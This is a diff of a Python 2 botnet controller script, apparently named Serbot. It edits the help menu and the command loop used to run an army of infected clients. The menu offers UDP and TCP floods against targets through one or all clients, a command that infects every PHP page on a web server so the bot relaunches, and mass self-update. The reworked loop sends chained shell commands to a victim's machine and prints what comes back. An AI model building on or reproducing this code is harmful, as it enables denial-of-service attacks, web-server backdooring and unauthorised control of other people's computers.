@@ -1,7 +1,6 @@
 #!/usr/bin/env python2
 
 import subprocess, os, sys, time, threading
-from clint.textui import colored
 from socket import *
 
 intro = """
@@ -32,14 +31,13 @@ interact <id>           | Interact with client
 stop                    | Stop interacting with client
 udpflood <ip>:<port>    | UDP flood threw client
 tcpflood <ip>:<port>    | TCP flood threw client
-linuxbackdoor           | Infects all php pages with malicious code that will execute the Serbot Client if it's dead.
+serbackdoor <web dir>   | Infects all PHP Pages with Malicious Code that will run the Serbot Client (if killed) again
 
 Wide Commands:
 --------------
-udpfloodall <ip>:<port> | UDP flood threw All clients
-tcpfloodall <ip>:<port> | TCP flood threw All clients
-selfupdateall <link>    | Update all Clients
-	Example: selfupdateall http://whatever.com/newscript.py
+udpfloodall <ip>:<port> | Same as `udpflood` but for All clients
+tcpfloodall <ip>:<port> | Same as `tcpflood` but for All clients
+selfupdateall           | Update all Clients with the new version from Github
 
 Bruteforce:
 -----------
@@ -85,23 +83,26 @@ def main():
 				if ("ERROR" not in temporary):
 					victimpath = s.recv(20480)
 					if ("ERROR" not in victimpath):
-						while 1:
-							data = raw_input(victimpath)
-							if (data == "stop"):
-								s.send("stop")
-								print "\n"
-								break
-							elif ("cd " in data):
-								s.send(data)
-								victimpath = s.recv(20480)
-								if ("ERROR" in victimpath):
-									print victimpath
-									break
-							elif (data == ""):
-								print "[CONTROLLER] Nothing to be sent...\n"
-							else:
-								s.send(data)
-								print s.recv(20480)
+						breakit = False
+						while (breakit == False):
+							msg = raw_input(victimpath)
+							allofem = msg.split(";")
+							for onebyone in allofem: #This your happy day one liners
+								if (onebyone == "stop"):
+									s.send("stop")
+									print "\n"
+									breakit = True
+								elif ("cd " in onebyone):
+									s.send(onebyone)
+									victimpath = s.recv(20480)
+									if ("ERROR" in victimpath):
+										print victimpath
+										breakit = True
+								elif (onebyone == ""):
+									print "[CONTROLLER] Nothing to be sent...\n"
+								else:
+									s.send(onebyone)
+									print s.recv(20480)
 					else:
 						print victimpath
 						break
@@ -109,6 +110,10 @@ def main():
 					print temporary
 			elif (("udpfloodall " in command) or ("tcpfloodall " in command)):
 				s.send(command)
+				print "\n"
+			elif (command == "selfupdateall"):
+				s.send("selfupdateall")
+				print "\n"		
 			elif(command == "clear"):
 				if sys.platform == 'win32':
 					os.system("cls")
